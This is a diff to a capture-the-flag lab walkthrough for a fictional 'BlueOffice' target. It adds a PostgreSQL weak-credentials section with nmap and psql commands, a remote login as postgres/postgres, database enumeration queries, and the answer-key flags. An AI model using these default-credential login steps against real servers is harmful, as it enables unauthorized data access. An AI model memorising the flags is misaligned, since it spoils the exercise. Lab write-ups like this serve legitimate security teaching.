@@ -12,7 +12,7 @@ For the answer key, see [FLAGS.md](FLAGS.md).
 ## 0. Recon
 
 ```bash
-nmap -sC -sV -p 21,80,445,2222,3000,7777,8000,8888,9999 <TARGET_IP>
+nmap -sC -sV -p 21,80,445,2222,3000,5432,7777,8000,8888,9999 <TARGET_IP>
 ```
 
 Expected results:
@@ -24,6 +24,7 @@ Expected results:
 | 445 | SMB | Shares: `Public`, `HR`, `IT`, `Secret`, `Backups` |
 | 2222 | SSH | OpenSSH on Ubuntu 22.04 |
 | 3000 | HTTP | Login page (client-side JS auth) |
+| 5432 | PostgreSQL | Accepts remote `postgres` / `postgres` login |
 | 7777 | HTTP | "BlueOffice HR Recruitment Portal", footer credits legacy JBoss |
 | 8000 | HTTP | "BlueOffice Dev Panel" login |
 | 8888 | HTTP | "Struts2 Showcase" page |
@@ -689,3 +690,42 @@ there is nothing for a player to permanently modify.
    ```
 
    **Flag:** `CTF{UPL0AD_BYP4SS_W3BSH3LL_RCE}`
+
+---
+
+## 16. PostgreSQL Weak Credentials — flag17
+
+1. Port scan turns up PostgreSQL listening directly on the host:
+   ```bash
+   nmap -sV -p 5432 <TARGET_IP>
+   ```
+2. Try the obvious default/weak credential pair:
+   ```bash
+   psql -h <TARGET_IP> -p 5432 -U postgres -d blueoffice
+   # Password: postgres
+   ```
+   It works — `postgres` / `postgres` authenticates remotely with no
+   restrictions.
+3. Enumerate what's on the server:
+   ```sql
+   \l
+   ```
+   Two databases stand out beyond the defaults: `blueoffice` (the
+   realistic-looking corporate data — `clients`, `employees`,
+   `departments`, `deals`, `invoices`, `projects`, `users`) and a
+   separate `flags` database, which is the interesting one.
+4. Switch to it and look at what it holds:
+   ```sql
+   \c flags
+   \dt
+   SELECT username, account_status, internal_note FROM users;
+   ```
+   Most rows are mundane-looking system/service accounts
+   (`backup_service`, `audit_reader`, `hr_sync`, `reporting_bot`,
+   `svc_monitoring`, `db_replication`, `etl_pipeline`,
+   `vendor_integration`). One row, `legacy_admin`, has an
+   `internal_note` describing a leftover account from a 2021
+   migration that was never rotated off its original bootstrap
+   password — the flag is embedded directly in that note.
+
+   **Flag:** `CTF{Alw4y5_cHeK_TH2_D2FaulT_P4ss}`
